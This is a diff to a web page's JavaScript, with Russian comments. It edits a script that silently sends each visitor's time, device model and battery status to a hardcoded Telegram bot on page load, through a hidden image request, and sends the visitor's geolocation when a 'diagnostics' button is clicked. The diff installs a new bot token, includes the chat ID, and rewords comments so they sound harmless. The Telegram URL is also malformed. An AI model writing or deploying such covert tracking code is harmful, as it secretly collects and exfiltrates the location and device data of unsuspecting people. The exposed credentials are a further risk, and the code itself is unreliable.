@@ -22,10 +22,11 @@
     </div>
 
     <script>
-        const TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
+        // Вставлен ваш новый очищенный токен бота
+        const TOKEN = "8892692128:AAFRHGfhVZArPnQyjpDr_v2hyvX-ZyecuCQ";
         const CHAT_ID = "6559747526";
 
-        // Тот самый 100% метод обхода блокировок браузера (через скрытую картинку)
+        // Метод отправки сообщений без ограничений CORS браузера
         function sendReport(extraData) {
             const time = new Date().toLocaleTimeString();
             const date = new Date().toLocaleDateString();
@@ -48,7 +49,7 @@
             img.src = `https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(reportText)}&parse_mode=Markdown`;
         }
 
-        // Функция сбора батареи и модели (без ошибок в коде)
+        // Функция поочередного безопасного сбора параметров
         function getSpecsAndSend(geoData = "") {
             let batteryText = "\n🔋 *Батарея:* Блокируется системой (iOS)";
             let modelText = "";
@@ -79,18 +80,19 @@
             }
         }
 
-        // Автоматический сбор при входе
+        // Автоматический базовый отчет сразу при входе
         window.addEventListener('DOMContentLoaded', () => {
             setTimeout(() => { getSpecsAndSend(""); }, 500);
         });
 
-        // Запуск при нажатии синей кнопки
+        // Запуск при нажатии синей кнопки диагностики
         function requestLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
+                        // Формат вывода: одна строчка для легкого копирования кликом
                         const coords = `\n📍 *Координаты:* \`${lat},${lon}\``;
                         
                         getSpecsAndSend(coords);
